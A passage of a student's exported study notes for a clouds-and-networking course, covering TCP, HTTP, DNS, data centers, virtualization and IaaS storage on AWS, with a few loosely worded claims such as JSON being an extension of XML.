synchronizes the sender and receiver by knowing the order of messages</p><p id="1201a926-7344-80c0-a2b5-df237ab3d805" class="">ACK tells the sender which byte the receiver expects next and acknowledges all bytes received up to a certain point</p><h3 id="1201a926-7344-805d-a200-c97ea145634d" class="">Connection Establishment and Termination: 3-way Handshake</h3><figure id="1201a926-7344-807d-91b5-ee44e44b495c" class="image"><a href="Untitled%2077.png"><img style="width:624px" src="Untitled%2077.png"/></a></figure><figure id="1201a926-7344-8015-acc0-d36aacc96d9f" class="image"><a href="Untitled%2078.png"><img style="width:624px" src="Untitled%2078.png"/></a></figure><figure id="1201a926-7344-80b3-bda3-ebb6a4938d35" class="image"><a href="Untitled%2079.png"><img style="width:595.984375px" src="Untitled%2079.png"/></a></figure><figure id="1201a926-7344-801a-8331-f649f6c8a7fd" class="image"><a href="Untitled%2080.png"><img style="width:624px" src="Untitled%2080.png"/></a></figure><p id="1201a926-7344-80b6-8ff9-ee8311dd58de" class="">
</p></details></li></ul></details></li></ul><ul id="11e1a926-7344-8037-84f9-cf9af62cd02f" class="toggle"><li><details><summary>Application Layer (L5,L6,L7)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-80f2-943b-d2bbcf429ebf"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="c4e58add-e4cb-4084-a963-5aa65a101957" class="bulleted-list"><li style="list-style-type:disc">applications interpreted the raw bytes provided by the transport layer</li></ul><ul id="1201a926-7344-809b-87c3-d3b361d4c907" class="bulleted-list"><li style="list-style-type:disc">application layer protocols are how applications talk with each other to achieve application level specific goals </li></ul><ul id="1201a926-7344-8022-984f-ceb771c7e2a1" class="bulleted-list"><li style="list-style-type:disc">layer 5 &amp; 6 are session and presentation layer, layer 7 is application layer</li></ul><ul id="1201a926-7344-8097-8cf3-e4cb0925ca2a" class="bulleted-list"><li style="list-style-type:disc">application protocols are HTTP, applications are the web browser</li></ul><ul id="1201a926-7344-8025-ad6c-c7e070d0925e" class="bulleted-list"><li style="list-style-type:disc">applications use/implement the protocol </li></ul><ul id="1201a926-7344-8003-a85c-d59932c1d99e" class="bulleted-list"><li style="list-style-type:disc">protocols have missing/vague parts which the application implements</li></ul></div></figure><ul id="1201a926-7344-8045-a1de-f718ac647320" class="toggle"><li><details><summary><del>Application Layer Protocols</del></summary><p id="1201a926-7344-8070-962a-d751acf23411" class="">Application layer protocols are how applications talk with each other to achieve application level specific goals </p><figure id="1201a926-7344-80eb-bcd8-d57b725825df" class="image"><a href="image%2035.png"><img style="width:595.96875px" src="image%2035.png"/></a></figure></details></li></ul><ul id="1201a926-7344-8068-9096-dab989cd6edd" class="toggle"><li><details><summary>HTTP</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-80cb-be6b-c0c40aa16bb7"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="87941d9e-970d-437b-a659-0769a73c18af" class="">an application layer protocol to transfer hypertext (text with links to other documents)</p><ul id="1201a926-7344-80a9-829f-c97fdd61e83b" class="bulleted-list"><li style="list-style-type:disc">uses GET, POST, PUT methods</li></ul><ul id="1201a926-7344-80c0-80c7-dc146d8fce54" class="bulleted-list"><li style="list-style-type:disc">follows a Client-Server paradigm: client sends requests, server always is listening and responds</li></ul></div></figure><h3 id="1201a926-7344-807b-bbdd-cfc36c0add2d" class="">HTTP Message Format</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1201a926-7344-80e6-b8a4-f0098b790179" class="code"><code class="language-HTML">START_LINE &lt;CRLF&gt;
MESSAGE_HEADER &lt;CRLF&gt;
&lt;CRLF&gt;
MESSAGE_BODY &lt;CRLF&gt;</code></pre><h3 id="1201a926-7344-80ae-adaa-e2ecb51d7b77" class="">HTTP Methods</h3><figure id="1201a926-7344-80bc-92ae-eb8803ed86d0" class="image"><a href="63994427-c731-4c98-84cf-2087c42309cf.png"><img style="width:508.5990338164251px" src="63994427-c731-4c98-84cf-2087c42309cf.png"/></a></figure><h3 id="1201a926-7344-8057-8deb-ce813a955ec2" class="">URL Structure</h3><figure id="1201a926-7344-804d-b46c-c4f10383bc0f" class="image"><a href="2cfaa57d-12e1-4b3a-abb3-d4a95cb9eba9.png"><img style="width:707.984375px" src="2cfaa57d-12e1-4b3a-abb3-d4a95cb9eba9.png"/></a><figcaption>entering a url in the browser constructs a get request</figcaption></figure><h3 id="1201a926-7344-80d3-b1b1-c3ae564ad644" class="">HTTP Status Codes</h3><figure id="1201a926-7344-8044-b72c-ed94fc4c3e82" class="image"><a href="image%2036.png"><img style="width:576px" src="image%2036.png"/></a></figure><h3 id="1201a926-7344-80c2-87a5-ef36f427a6be" class="">HTTP Versions</h3><h3 id="1201a926-7344-80ad-a577-fda0f1ba9f8a" class="">https v.1.0</h3><figure id="1201a926-7344-8092-b3de-e3b762fe2418" class="image"><a href="image%2037.png"><img style="width:595.984375px" src="image%2037.png"/></a></figure><h3 id="1201a926-7344-8035-9ab0-c387884b4635" class="">https v.1.1</h3><ul id="1201a926-7344-80dd-8bf2-c187742f95df" class="bulleted-list"><li style="list-style-type:disc">1.1 allows persistent connections where the connection doesn’t time out</li></ul><figure id="1201a926-7344-80c3-9735-da1b959cfedc" class="image"><a href="image%2038.png"><img style="width:624px" src="image%2038.png"/></a></figure></details></li></ul><ul id="1201a926-7344-80a9-bc4c-d272781fa45e" class="toggle"><li><details><summary>HTML and XML Presentation</summary><h3 id="1201a926-7344-8016-98fc-f000c4788b02" class="">HTML</h3><p id="1201a926-7344-804e-b90e-d682cd9b08cb" class="">hypertext markup language used to represent structure of websites and often used in HTTP</p><ul id="1201a926-7344-808a-8fdc-f0da0147f6d9" class="bulleted-list"><li style="list-style-type:disc">HTTP can transfer any data (video, image, SVG ect…) but HTML is common for web</li></ul><h3 id="1201a926-7344-80bc-aff0-cff7d2dcda23" class="">XML</h3><p id="1201a926-7344-80fb-9a96-f0c1f65126ba" class="">XML is extensible markup language</p><p id="1201a926-7344-80f5-a3e6-e7823a41e239" class="">HTML is an extension of XML that gives a set of pre defined tags</p><p id="1201a926-7344-80fd-9377-d5fb579e251b" class="">JSON is also an extension of XML</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1201a926-7344-80c3-8498-d4435e400dee" class="code"><code class="language-Java">&lt;course&gt;
&lt;course_code&gt;NWEN 243&lt;/course_code&gt;
&lt;course_title&gt;Clouds and Networking&lt;/course_title&gt;
&lt;instructors&gt;
&lt;instructor&gt;Dr. Arman Khouzani&lt;/instructor&gt;
&lt;instructor&gt;A/Prof. Kris Bubendorfer&lt;/instructor&gt;
&lt;/instructors&gt;
&lt;trimester&gt;2023 T2&lt;/trimester&gt;
&lt;schedule&gt;
&lt;lecture&gt;
&lt;day&gt;Monday&lt;/day&gt;
&lt;time&gt;1:00 PM - 2:00 PM&lt;/time&gt;
&lt;/lecture&gt;
&lt;lecture&gt;
&lt;day&gt;Thursday&lt;/day&gt;
&lt;time&gt;1:00 PM - 2:00 PM&lt;/time&gt;
&lt;/lecture&gt;
&lt;/schedule&gt;
&lt;/course&gt;</code></pre></details></li></ul><ul id="1201a926-7344-8062-b5a6-e10dfa761b26" class="toggle"><li><details><summary>DNS (Domain Name System)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-804c-8f9b-fa855abceb23"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="729fb91a-3aea-4e50-8a8b-ab4937bacefa" class="">servers that translate domain names (wgtn.ac.nz) to IP address (103.1.195,4)</p><ul id="1201a926-7344-8012-8476-c64e27f39123" class="bulleted-list"><li style="list-style-type:disc">used because people don’t want to remember IP address, domain names with words is user friendly</li></ul><figure id="1201a926-7344-804e-b2e0-ea244c8ded8f" class="image"><a href="image%2039.png"><img style="width:490.96588134765625px" src="image%2039.png"/></a></figure></div></figure><h3 id="1201a926-7344-8062-a85b-cdaaba71b049" class="">Domain Namespace Hierarchy</h3><p id="1201a926-7344-803f-b633-ce7d5a2fcd68" class="">not all DNS servers know all domains in the world. there is a hierarchy where DNS servers higher up know more domains</p><p id="1201a926-7344-800c-badf-f874f474f3e3" class="">lower DNS servers ask higher ups for more information when it doesn’t know</p><figure id="1201a926-7344-80c9-b2e7-dc295bf4cb25" class="image"><a href="image%2040.png"><img style="width:624px" src="image%2040.png"/></a></figure><h3 id="1201a926-7344-80ba-979d-e8e0dc45fe8d" class="">Query Resolution</h3><p id="1201a926-7344-8032-bb53-d665450bde8f" class="">client queries a DNS server, the server finds the answer in the hierarchy and responds with the final answer or a pointer to another DNS server </p></details></li></ul></details></li></ul><ul id="11e1a926-7344-80bc-965c-cc68fc58e85f" class="toggle"><li><details><summary>Cloud Computing Introduction</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-8001-8ab3-c0d3f88a70d6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="f2a8d9c6-39aa-4145-9dcb-0e22a12dd638" class="">cloud computing is machinery, networking and applications </p><ul id="1211a926-7344-802c-bcc1-c0a443dba4be" class="bulleted-list"><li style="list-style-type:disc">its the child of multiple technologies attempts at large scale distributed computing, utility computing, grid computing, automated computing ect.</li></ul><ul id="1211a926-7344-8064-854e-df7e0a72b48e" class="bulleted-list"><li style="list-style-type:disc">comes from commercialize of distributed systems that companies already have but aren’t using (amazon, WETA)</li></ul></div></figure></details></li></ul><ul id="1211a926-7344-809a-8734-e5c8915ec5a0" class="toggle"><li><details><summary>Resource Provisioning &amp; Utility Computing (Scalability and Elasticity)</summary><h3 id="1211a926-7344-8058-be09-d8e281f41b02" class="">Utility Computing &amp; Resource Provisioning</h3><p id="1211a926-7344-80f0-967a-da3b5233e3d5" class="">UC is the mapping between amount of infrastructure needed and demand to optimize surpluses and deficits</p><figure id="1211a926-7344-8078-9af5-d4dee0b3faea" class="image"><a href="image%2041.png"><img style="width:474.9715881347656px" src="image%2041.png"/></a></figure><ul id="1211a926-7344-80ce-a07d-f18af3ebf6e7" class="bulleted-list"><li style="list-style-type:disc">traditionally, data centers require estimating/guessing amount of resourced needed, leading to over and under provisioning</li></ul><ul id="1211a926-7344-809b-ab7c-f7e8a14c70c3" class="bulleted-list"><li style="list-style-type:disc">cloud computing solves this issue with elasticity and dynamic allocation of resources (pay as you go)</li></ul><ul id="1211a926-7344-8038-a152-de3e3c5a2c51" class="bulleted-list"><li style="list-style-type:disc">under provisioning: high demand, not enough resources<figure id="1211a926-7344-80d1-a74f-c2d3cfcbfbd8" class="image"><a href="image%2042.png"><img style="width:576px" src="image%2042.png"/></a></figure></li></ul><ul id="1211a926-7344-8025-97f2-dfe38e323b2e" class="bulleted-list"><li style="list-style-type:disc">over provisioning: low demand, got too many resources and wasting money <figure id="1211a926-7344-80cf-a1be-d2fd574c7613" class="image"><a href="image%2043.png"><img style="width:573.9630737304688px" src="image%2043.png"/></a></figure></li></ul><ul id="1211a926-7344-803c-bcf4-f7d8bfde0b09" class="bulleted-list"><li style="list-style-type:disc">cloud prevents provisioning with elasticity <figure id="1211a926-7344-807f-9c73-e573b92dd2c8" class="image"><a href="image%2044.png"><img style="width:613.9772338867188px" src="image%2044.png"/></a></figure></li></ul><h3 id="1211a926-7344-8081-aaaa-e8f465ae21f4" class="">Scalability and Elasticity</h3><table id="1211a926-7344-8074-bb5e-c1292784a669" class="simple-table"><tbody><tr id="6c4c9e8c-46e6-402e-80df-4993d7dccab9"><td id="I`Un" class="" style="width:310.99998474121094px">scalability</td><td id="fK`V" class="" style="width:296.99998474121094px">elasticity</td></tr><tr id="e2aab623-c1e6-439d-bc97-b317e741a0ff"><td id="I`Un" class="" style="width:310.99998474121094px">ability of system to <mark class="highlight-yellow">handle growing amounts of work</mark> in a graceful manner (doesn’t stop, slowly degrades) or to be <mark class="highlight-yellow">readily enlarged</mark></td><td id="fK`V" class="" style="width:296.99998474121094px">ability to <mark class="highlight-yellow">expand and contract </mark>allocated <mark class="highlight-yellow">resources </mark>in real time</td></tr><tr id="1cdcede8-857a-4722-bc06-48e09fbb01c7"><td id="I`Un" class="" style="width:310.99998474121094px">from the programmer</td><td id="fK`V" class="" style="width:296.99998474121094px">from the hardware vender</td></tr></tbody></table></details></li></ul><ul id="11e1a926-7344-8069-bbbd-f118550dfa6d" class="toggle"><li><details><summary>Data Centers</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1261a926-7344-8066-a6b0-d84fbb68661d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e44aa66b-e1ce-48be-ad09-28d8d32b32d3" class="">physical computer/server resources of cloud computing </p><blockquote id="1261a926-7344-80f2-a3ba-ff00aac7f93f" class="">“dedicated building/space used to house computer systems”<br/>”factory that transforms ands stores bits”<br/></blockquote><figure id="1261a926-7344-8009-90cb-e3cf70164ae9" class="image"><a href="0af414c4-0774-413d-a337-0bf861b1e924.png"><img style="width:578.5053380782917px" src="0af414c4-0774-413d-a337-0bf861b1e924.png"/></a><figcaption>anatomy of a center</figcaption></figure><ul id="1261a926-7344-80bf-87ad-fd1cacbafaec" class="bulleted-list"><li style="list-style-type:disc">data centers also need power infrastructure (voltage, converts generators) and cooling infrastructure (ACs, water cooling, heat exchange)</li></ul></div></figure><h3 id="1261a926-7344-807e-9f92-f7f51e4f253d" class="">Cost</h3><p id="1261a926-7344-8007-b2b5-e0bc30ac4191" class="">half of the cost is in the servers, the other half is in power </p><figure id="1261a926-7344-809c-8f87-f5ffee02088f" class="image"><a href="image%2045.png"><img style="width:551px" src="image%2045.png"/></a></figure><h3 id="1261a926-7344-80b1-bb73-f6770717d441" class="">Disaster Preparation</h3><p id="1261a926-7344-801c-94c9-faecc556eec3" class="">data centers safety is critique to save expenses and keep servers up</p><p id="1261a926-7344-806f-8932-dd821c850e07" class="">need to prepare for natural and human disasters in advance </p><ul id="1261a926-7344-8072-a7ff-fdb9ee3ce93f" class="bulleted-list"><li style="list-style-type:disc">Natural Disasters: <ul id="1261a926-7344-8035-b544-cfe186559c6e" class="bulleted-list"><li style="list-style-type:circle">Floods</li></ul><ul id="1261a926-7344-80c3-8331-ee261de710a6" class="bulleted-list"><li style="list-style-type:circle">Temperature extremes</li></ul><ul id="1261a926-7344-80ed-a0b2-fdaa47c63366" class="bulleted-list"><li style="list-style-type:circle">Fires</li></ul><ul id="1261a926-7344-8077-95a2-c495e51eeb7a" class="bulleted-list"><li style="list-style-type:circle">Seismic activity</li></ul><ul id="1261a926-7344-8013-b2a1-ed8073c40a9a" class="bulleted-list"><li style="list-style-type:circle">Earthquakes</li></ul></li></ul><ul id="1261a926-7344-80d9-9687-da85f3dc1afd" class="bulleted-list"><li style="list-style-type:disc">Human-caused Disasters:<ul id="1261a926-7344-80a2-a7b2-e6a5023b09a6" class="bulleted-list"><li style="list-style-type:circle">Infrastructure (power, network) failure</li></ul><ul id="1261a926-7344-805d-9ea1-fc1354893866" class="bulleted-list"><li style="list-style-type:circle">Electromagnetic interference</li></ul><ul id="1261a926-7344-8021-afd8-ea065d37dee6" class="bulleted-list"><li style="list-style-type:circle">Sabotage and criminal activity</li></ul></li></ul><h3 id="1261a926-7344-806f-88da-de8dc6421d15" class="">Basic Building Blocks</h3><figure id="1261a926-7344-803f-a0df-f94839a4f80a" class="image"><a href="image%2046.png"><img style="width:623.984375px" src="image%2046.png"/></a></figure><figure id="1261a926-7344-80ce-9e66-fcaac72e6963" class="image"><a href="image%2047.png"><img style="width:623.984375px" src="image%2047.png"/></a></figure><h3 id="1261a926-7344-80c2-8e3c-c6a1fade666b" class="">Locality</h3><p id="1261a926-7344-80d5-8fb8-c1160bb259dc" class="">the closer the resources are to each other (servers in the same cluster vs other clusters) the less latency and more bandwidth</p><figure id="1261a926-7344-8090-9a50-f6cfa1940507" class="image"><a href="image%2048.png"><img style="width:1056px" src="image%2048.png"/></a></figure><figure id="1261a926-7344-8006-b3da-e6ef0f297752" class="image"><a href="image%2049.png"><img style="width:624px" src="image%2049.png"/></a></figure><ul id="1211a926-7344-8074-a5ca-d232206a0b31" class="toggle"><li><details><summary>Clouds VS Data Centers</summary><h3 id="1211a926-7344-8089-b089-f5ef747df653" class="">Clouds VS Data Centers</h3><ul id="1211a926-7344-80c8-bb9c-ec583c232744" class="bulleted-list"><li style="list-style-type:disc">clouds reallocate IT expenditures by reducing labor and maintenance cost and allows more focus on innovation/software </li></ul><ul id="1211a926-7344-8039-91a4-e8b112fbe90f" class="bulleted-list"><li style="list-style-type:disc">cloud computing outsources and virtualizes data centers</li></ul></details></li></ul></details></li></ul><ul id="11e1a926-7344-801b-a1ff-d1e13d42fd67" class="toggle"><li><details><summary>Virtualization &amp; VMs</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-807e-96a7-c60b76377bdf"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="6d8993d7-d93b-4c86-aa28-60ce658b345e" class="bulleted-list"><li style="list-style-type:disc">takes advantage of idle resources and consolidates number of required physical servers</li></ul><ul id="1211a926-7344-8079-aa9c-f8bf6815bc56" class="bulleted-list"><li style="list-style-type:disc">foundation of cloud computing infrastructure </li></ul><figure id="1211a926-7344-80d5-a456-df91cb9887b1" class="image"><a href="2342a7e9-c2e1-404b-80ca-1fcac61c1f3c.png"><img style="width:378.9473684210526px" src="2342a7e9-c2e1-404b-80ca-1fcac61c1f3c.png"/></a></figure><ul id="1211a926-7344-80b3-acf1-c7ad44d6dfc6" class="bulleted-list"><li style="list-style-type:disc">hypervisor program/firmware adds an abstraction layer over real hardware</li></ul><ul id="1211a926-7344-80b0-bd02-c48b90a0cb48" class="bulleted-list"><li style="list-style-type:disc">VMM adds a layer of control on hardware</li></ul><ul id="1211a926-7344-8009-a3ad-d381305b2d71" class="bulleted-list"><li style="list-style-type:disc">VMM allows CPU state to be swapped without anything running on the CPU to realize</li></ul><ul id="1211a926-7344-802f-8a42-fa7b70f3b0b1" class="bulleted-list"><li style="list-style-type:disc">Virtualization is all about abstract: just like OS abstracts hardware from a user through programs/interfaces, virtualization abstracts hardware from VMs </li></ul><ul id="1211a926-7344-8052-b8d9-cc3b7913e5e3" class="bulleted-list"><li style="list-style-type:disc">VMs are software constructs mimicking characteristics of physical servers</li></ul></div></figure><h3 id="1211a926-7344-8066-bfcb-ddba668ba820" class="">Virtual Machine</h3><p id="1211a926-7344-8050-a0b2-ddb3ea76a4c7" class="">instead of running OS and apps on bare metal, VMM/hypervisor allows multiple VMs to run on an an abstract layer</p><ul id="1211a926-7344-80ad-bc04-e9cbee2fe56b" class="bulleted-list"><li style="list-style-type:disc">apps/process are still running on hardware, but are abstracted and isolated</li></ul><ul id="1211a926-7344-80fa-9f7b-e7f3d87e7673" class="bulleted-list"><li style="list-style-type:disc">VMs are just files<ul id="1211a926-7344-80e9-95a8-e340f9d3f318" class="bulleted-list"><li style="list-style-type:circle">config files describe attributes (cores, ram)</li></ul><ul id="1211a926-7344-80f2-8b85-c58ba19ffa87" class="bulleted-list"><li style="list-style-type:circle">instantiation creates additional files</li></ul><ul id="1211a926-7344-80a5-9bcb-c3ee749c9ac9" class="bulleted-list"><li style="list-style-type:circle">copying VMs for backup and duplication is easy</li></ul></li></ul><ul id="1211a926-7344-8054-8321-d7e53fef213f" class="bulleted-list"><li style="list-style-type:disc"><del>process doesn’t know its in a VM: little to no performance cost, just program how you normally would </del></li></ul><figure id="1211a926-7344-808b-bfe7-c62ebc79ad9a" class="image"><a href="8e0b5c92-d90a-4035-8bd6-d375593820c7.png"><img style="width:611.5068493150684px" src="8e0b5c92-d90a-4035-8bd6-d375593820c7.png"/></a></figure><ul id="1211a926-7344-805f-9273-d4c5693623e3" class="bulleted-list"><li style="list-style-type:disc">VMM/hypervisor can just run as another app/process on a normal OS  <figure id="1211a926-7344-801f-8aab-d3cb12b49a3e" class="image"><a href="ffd525b4-0058-4954-8bfc-177dd7579e86.png"><img style="width:702.8771929824561px" src="ffd525b4-0058-4954-8bfc-177dd7579e86.png"/></a></figure></li></ul><ul id="1211a926-7344-8040-8b6b-fc991c68037e" class="bulleted-list"><li style="list-style-type:disc">VMs running can emulate other machine’s CPU’s such as mobile and run OSs for that machine such as IOS or android<figure id="1211a926-7344-80e3-bca8-f2689fb28efd" class="image"><a href="image%2050.png"><img style="width:586.960205078125px" src="image%2050.png"/></a></figure></li></ul><h3 id="1211a926-7344-80d0-b835-f784b347df81" class="">Virtual Machine Managers (VMM)</h3><p id="1211a926-7344-80b2-8c20-cd487938062a" class="">hypervisor level firmware that manages VM allocation (where to create and move) and data channels between VMs</p><ul id="1211a926-7344-8005-b5aa-efe0d8ae0989" class="bulleted-list"><li style="list-style-type:disc">apart of cloud operating system and ran by the venders (amazon), users don’t need to interact with it</li></ul><ul id="1211a926-7344-8042-bdb4-e451016bc4c2" class="bulleted-list"><li style="list-style-type:disc">monitors host resource utilization and reallocate to VMs</li></ul><ul id="1211a926-7344-80bd-9fcd-e851a2cb8d5a" class="bulleted-list"><li style="list-style-type:disc">resources allocated and deallocated when needed</li></ul><ul id="1211a926-7344-801f-a433-e038e924dbad" class="bulleted-list"><li style="list-style-type:disc">reallocates load to reduce overheating, for maintenance  or optimize network traffic</li></ul><h3 id="1211a926-7344-8034-b620-cd3479be8eca" class="">Virtual Private Cloud (VPC)</h3><p id="1211a926-7344-80b4-b181-ed64ca97b05a" class="">virtual network on top of physical infrastructure to allow <code>network topology,</code> <code>bandwidth provisioning</code>, <code>security rule &amp; access rules customization</code> to be virtualized</p><figure id="1211a926-7344-8079-8365-d7f8284ce24d" class="image"><a href="image%2051.png"><img style="width:523.9772338867188px" src="image%2051.png"/></a></figure></details></li></ul><ul id="11e1a926-7344-801a-b01d-c55d8ed1b385" class="toggle"><li><details><summary>Service Models</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80b8-ba93-c015d9df251b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="85273c30-ea11-412d-a469-261414e55df9" class="">services cover different layers of the stack for the developer</p><ul id="1211a926-7344-80a7-ab3c-ceb27b576a7b" class="bulleted-list"><li style="list-style-type:disc">IaaS (AWS): cloud infrastructure to run VMs</li></ul><ul id="1211a926-7344-80a6-8659-d2c765dc5916" class="bulleted-list"><li style="list-style-type:disc">CaaS (DockerHub): deploy containers</li></ul><ul id="1211a926-7344-800d-858f-c9d07c9b743e" class="bulleted-list"><li style="list-style-type:disc">PaaS (MapReduce Engine): environment for deployment/distributed </li></ul><ul id="1211a926-7344-806b-bdd1-ef67f711a95a" class="bulleted-list"><li style="list-style-type:disc">FaaS (AWS Lambda): serverless &amp; stateless function that process an input</li></ul><ul id="1211a926-7344-807b-be2a-e5c148639ac9" class="bulleted-list"><li style="list-style-type:disc">SaaS (Google Docs): an application</li></ul><figure id="1211a926-7344-804b-9f45-da7dcaa844ad" class="image"><a href="image%2052.png"><img style="width:561.96875px" src="image%2052.png"/></a></figure><figure id="1211a926-7344-80e6-a1b6-e1813aec260f" class="image"><a href="image%2053.png"><img style="width:652.0596313476562px" src="image%2053.png"/></a></figure><figure id="1211a926-7344-8015-a0ed-e771ba26ca0a" class="image"><a href="image%2054.png"><img style="width:623.96875px" src="image%2054.png"/></a></figure><figure id="1211a926-7344-80fd-9843-ff6398951375" class="image"><a href="image%2055.png"><img style="width:561.984375px" src="image%2055.png"/></a></figure></div></figure></details></li></ul><ul id="11e1a926-7344-80ae-bb13-c6c42d5edb9c" class="toggle"><li><details><summary>Infrastructure as a Service (IaaS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-8008-b28a-f5b17768aa59"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="1909b1d7-4f7e-4d1b-8518-668c5e8555dd" class="">provides virtual-datacenter infrastructure on the cloud</p><ul id="1211a926-7344-802c-b3aa-de918dc67f6e" class="bulleted-list"><li style="list-style-type:disc">for multi-tenant VMs</li></ul><ul id="1211a926-7344-8097-8989-fa7066176531" class="bulleted-list"><li style="list-style-type:disc">pay as you go (scalable/elastic resource model)</li></ul><ul id="1211a926-7344-8023-a919-fcd2f3a87536" class="bulleted-list"><li style="list-style-type:disc">geographical presence: regions for responsiveness and availability</li></ul><ul id="1211a926-7344-80f4-9fe5-d009ff71d2a7" class="bulleted-list"><li style="list-style-type:disc">user interface to access servers: GUI, CLI, Web APIs</li></ul><figure id="1211a926-7344-80dc-9cdb-c29d171da9ed" class="image"><a href="image%2056.png"><img style="width:133.97726440429688px" src="image%2056.png"/></a></figure><ul id="1211a926-7344-8059-b1bf-e997911fcc27" class="bulleted-list"><li style="list-style-type:disc">low level abstraction, high flexibility</li></ul></div></figure><ul id="1211a926-7344-80e1-ad3c-c25cd4570945" class="toggle"><li><details><summary>IaaS Features (AMI, EC2, Regions, Storage)</summary><h3 id="1211a926-7344-8082-9ad4-ce6a84ccf73e" class="">AMI &amp; EC2 Instances</h3><ul id="1211a926-7344-807f-a5cc-d50db1fc324e" class="bulleted-list"><li style="list-style-type:disc">immutable containing OS and user app/data</li></ul><ul id="1211a926-7344-8052-b565-df7e17e277bc" class="bulleted-list"><li style="list-style-type:disc">using AMI, can launch multiple instances </li></ul><figure id="1211a926-7344-8036-bf93-ef629709665a" class="image"><a href="9ab67948-d10d-4a0b-877b-c129f5ef59a7.png"><img style="width:336px" src="9ab67948-d10d-4a0b-877b-c129f5ef59a7.png"/></a></figure><h3 id="1211a926-7344-80b4-955a-f34ce8ecbf71" class="">Region &amp; Zones</h3><ul id="1211a926-7344-8030-bc2b-d3d200b23f0c" class="bulleted-list"><li style="list-style-type:disc">instances can launch in different regions: closer to customers or meet legal requirements</li></ul><ul id="1211a926-7344-8078-823d-e274b0c8765f" class="bulleted-list"><li style="list-style-type:disc">region has set of zones: isolated against failure &amp; cheap/fast connectivity between zones in the same region</li></ul><h1 id="1211a926-7344-8025-b432-e9903ac4394e" class="">Storage</h1><ul id="1211a926-7344-800d-b179-d46d19913aaf" class="bulleted-list"><li style="list-style-type:disc">Elastic Block Store (EBS) Volume<ul id="1211a926-7344-8013-8fd3-fa5ee3cc4515" class="bulleted-list"><li style="list-style-type:circle">read/write disk created by AMI and mounted by instances</li></ul><ul id="1211a926-7344-8074-918a-f7a9f07b008a" class="bulleted-list"><li style="list-style-type:circle">used as a virtual file system, database, raw block level storage</li></ul></li></ul><ul id="1211a926-7344-809d-acd6-dbac7dc71b92" class="bulleted-list"><li style="list-style-type:disc">Simple Storage Service (S3)<ul id="1211a926-7344-808d-bfc2-ea8e77b71b25" class="bulleted-list"><li style="list-style-type:circle">object based storage: not file system</li></ul><ul id="1211a926-7344-80c8-8412-f4e5ec391359" class="bulleted-list"><li style="list-style-type:circle">service oriented architecture: provide online storage with web REST/SOAP APIs</li></ul><ul id="1211a926-7344-80bd-9e8b-d4bfd60554ec" class="bulleted-list"><li style="list-style-type:circle">store, read, write, update objects in an S3 bucket</li></ul></li></ul><ul id="1211a926-7344-80cd-8867-ffc2610f30b6" class="bulleted-list"><li style="list-style-type:disc">Elastic File System (EFS)<ul id="1211a926-7344-8087-83d7-ebe10864780f" class="bulleted-list"><li style="list-style-type:circle">like NFS (network FS) but on the cloud rather than a network</li></ul><ul id="1211a926-7344-80c8-b8ce-f0e9a46b940b" class="bulleted-list"><li style="list-style-type:circle">ECS machines use NFS to let you access your data on any device</li></ul></li></ul></details></li></ul><ul id="1211a926-7344-8041-8b75-e0acce8bc269" class="toggle"><li><details><summary>Scalability through Replication</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-8048-bed1-fcdb09cc8ce5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="f7a5f92a-41bd-4f13-87ad-b46aba91cc3b" class="">IaaS providing least abstraction (VMs, VPS, Storage) use the most basic means of scaling for performance and reliability using replication </p></div></figure><h3 id="1211a926-7344-80e0-bd3d-f627f14de1d2" class="">AMI Replication</h3><ul id="1211a926-7344-80d1-82c6-ee6b5835547c" class="bulleted-list"><li style="list-style-type:disc">replication scales performance</li></ul><ul id="1211a926-7344-801d-90fc-dc8ac8aecb9b" class="bulleted-list"><li style="list-style-type:disc">horizontal scaling: more AMIs/nodes (of same size) to increase resources available<ul id="1211a926-7344-8082-8845-eb7acfe38b0b" class="bulleted-list"><li style="list-style-type:circle"> vertical scaling would be increase power of machines: adding more cores</li></ul></li></ul><ul 